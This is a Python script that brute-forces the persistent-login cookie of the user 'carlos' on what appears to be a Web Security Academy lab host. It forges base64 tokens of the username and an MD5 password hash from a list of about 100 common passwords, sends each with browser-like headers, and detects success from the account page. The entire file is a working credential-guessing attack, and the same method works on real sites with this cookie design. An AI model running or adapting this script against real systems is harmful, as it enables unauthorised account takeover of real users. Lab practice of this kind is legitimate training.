#!/usr/bin/env python3

import requests
import base64
import hashlib
import sys
import concurrent.futures
import threading
from urllib.parse import urljoin

# Target configuration
HOST = "0ae60023031bd06b80dec27f00c70052.web-security-academy.net"
BASE_URL = f"https://{HOST}"
TARGET_PATH = "/my-account?id=carlos"

# Common passwords list
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", 
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", 
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", 
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", 
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", 
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", 
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", 
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", 
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", 
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", 
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", 
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", 
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", 
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", 
    "montana", "moon", "moscow"
]

def generate_auth_token(username, password):
    """Generate Base64 authentication token in format username:md5_hash"""
    password_hash = hashlib.md5(password.encode()).hexdigest()
    auth_string = f"{username}:{password_hash}"
    return base64.b64encode(auth_string.encode()).decode()

def test_authentication(auth_token, password):
    """Test if authentication token grants access to carlos account"""
    
    headers = {
        'Host': HOST,
        'Cookie': f'stay-logged-in={auth_token}',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"macOS"',
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': f'{BASE_URL}/login',
        'Accept-Encoding': 'gzip, deflate, br',
        'Priority': 'u=0, i'
    }
    
    try:
        response = requests.get(urljoin(BASE_URL, TARGET_PATH), headers=headers, timeout=10)
        
        # Check if we successfully accessed carlos's account
        if response.status_code == 200:
            # Look for indicators of successful authentication
            response_text = response.text.lower()
            
            # Check for "update email" which indicates successful login
            if "update email" in response_text:
                return True, response.status_code, "SUCCESS: Found 'update email' - authenticated as carlos"
            elif "carlos" in response_text:
                return True, response.status_code, "SUCCESS: Found 'carlos' in response"
            else:
                return False, response.status_code, "Failed: No authentication indicators found"
        else:
            return False, response.status_code, f"Failed: HTTP {response.status_code}"
            
    except requests.exceptions.RequestException as e:
        return False, 0, f"Request failed: {str(e)}"

def main():
    print(f"[*] Starting brute force attack on carlos account")
    print(f"[*] Target: {BASE_URL}{TARGET_PATH}")
    print(f"[*] Testing {len(PASSWORDS)} passwords...")
    print("-" * 60)
    
    successful_passwords = []
    
    for i, password in enumerate(PASSWORDS, 1):
        # Generate authentication token
        auth_token = generate_auth_token("carlos", password)
        
        print(f"[{i:3d}/{len(PASSWORDS)}] Testing password: {password:<15} ", end="")
        
        # Test authentication
        success, status_code, message = test_authentication(auth_token, password)
        
        if success:
            print(f"✓ {message}")
            successful_passwords.append({
                'password': password,
                'token': auth_token,
                'status': status_code,
                'message': message
            })
        else:
            print(f"✗ {message}")
    
    print("-" * 60)
    
    if successful_passwords:
        print(f"\n[+] SUCCESSFUL AUTHENTICATION(S) FOUND:")
        for result in successful_passwords:
            print(f"    Password: {result['password']}")
            print(f"    Token: {result['token']}")
            print(f"    Status: {result['status']}")
            print(f"    Message: {result['message']}")
            print()
    else:
        print("\n[-] No successful authentications found")
    
    return len(successful_passwords) > 0

if __name__ == "__main__":
    try:
        success = main()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)